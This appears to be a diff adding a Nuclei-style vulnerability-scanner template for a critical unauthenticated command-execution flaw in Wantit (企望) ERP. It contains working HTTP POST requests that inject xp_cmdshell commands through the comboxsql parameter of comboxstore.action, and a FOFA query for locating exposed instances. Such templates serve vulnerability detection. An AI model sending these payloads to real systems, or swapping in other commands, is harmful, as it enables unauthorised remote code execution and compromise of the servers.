@@ -1,0 +1,40 @@
+id: wantit-erp-comboxstore-rce
+
+info:
+  name: 企望 ERP 系统 ERP comboxstore.action - rce
+  author: leadlife
+  severity: critical
+  description: Wantit ERP allows remote unauthenticated users to to execute arbitrary commands.
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-77
+  metadata:
+    verified: false
+    fofa-query: app="企望-ERP系统" || title="企望制造ERP系统"
+  tags: wantit,rce,erp
+
+http:
+  - raw:
+        - |
+          POST /mainFunctions/comboxstore.action HTTP/1.1
+          Content-Type: application/x-www-form-urlencoded
+          Host: {{Hostname}}
+
+          comboxsql=exec%20xp_cmdshell%20'ipconfig'
+
+        - |
+          POST /mainFunctions/comboxstore.action HTTP/1.1
+          Content-Type: application/x-www-form-urlencoded
+          Host: {{Hostname}}
+
+          comboxsql=exec%20xp_cmdshell%20'id'
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "Windows IP"
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+        condition: or
